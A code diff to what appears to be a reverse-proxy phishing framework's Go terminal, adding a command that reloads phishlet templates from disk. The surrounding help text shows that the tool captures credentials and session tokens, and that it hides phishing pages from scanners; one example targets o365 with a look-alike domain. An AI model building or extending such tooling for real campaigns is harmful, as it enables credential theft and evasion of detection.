@@ -2181,6 +2181,15 @@ func (t *Terminal) handlePhishlets(args []string) error {
 		t.output("%s", t.sprintPhishletStatus(""))
 		return nil
 	} else if pn == 1 {
+		if args[0] == "reload" {
+			reloaded, failed := t.cfg.ReloadAllPhishlets()
+			if failed > 0 {
+				log.Warning("reloaded %d phishlet(s), %d failed (check logs above)", reloaded, failed)
+			} else {
+				log.Success("reloaded %d phishlet(s)", reloaded)
+			}
+			return nil
+		}
 		_, err := t.cfg.GetPhishlet(args[0])
 		if err == nil {
 			t.output("%s", t.sprintPhishletStatus(args[0]))
@@ -2188,6 +2197,12 @@ func (t *Terminal) handlePhishlets(args []string) error {
 		}
 	} else if pn == 2 {
 		switch args[0] {
+		case "reload":
+			if err := t.cfg.ReloadPhishlet(args[1]); err != nil {
+				return err
+			}
+			log.Success("reloaded phishlet: %s", args[1])
+			return nil
 		case "delete":
 			err := t.cfg.DeleteSubPhishlet(args[1])
 			if err != nil {
@@ -3347,12 +3362,12 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
 	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")
 
-	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.\n\nQuickstart:\n  set hostname:   phishlets hostname <name> <fqdn>\n  enable:         phishlets enable <name>\n  disable:        phishlets disable <name>\n  hide/unhide:    phishlets hide <name> | phishlets unhide <name>\n  child phishlet: phishlets create <tpl> <child> k1=v1 k2=v2\n\nExamples:\n  phishlets hostname o365 login.corp-portal.com\n  phishlets enable o365\n  phishlets disable o365", LAYER_TOP,
+	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.\n\nQuickstart:\n  set hostname:   phishlets hostname <name> <fqdn>\n  enable:         phishlets enable <name>\n  disable:        phishlets disable <name>\n  hide/unhide:    phishlets hide <name> | phishlets unhide <name>\n  child phishlet: phishlets create <tpl> <child> k1=v1 k2=v2\n  reload all:     phishlets reload\n  reload one:     phishlets reload <name>\n\nExamples:\n  phishlets hostname o365 login.corp-portal.com\n  phishlets enable o365\n  phishlets disable o365\n  phishlets reload o365", LAYER_TOP,
 		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
-			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("reload", readline.PcItemDynamic(t.phishletPrefixCompleter))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
@@ -3364,6 +3379,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
+	h.AddSubCommand("phishlets", []string{"reload"}, "reload", "reload all phishlet YAML files from disk without restarting")
+	h.AddSubCommand("phishlets", []string{"reload"}, "reload <phishlet>", "reload a single phishlet YAML file from disk without restarting")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.\n\nQuickstart:\n  list sessions:  sessions\n  view detail:    sessions <id>\n  delete one:     sessions delete <id>\n  delete all:     sessions delete all\n  export:         sessions export <id>", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all")), readline.PcItem("export")))
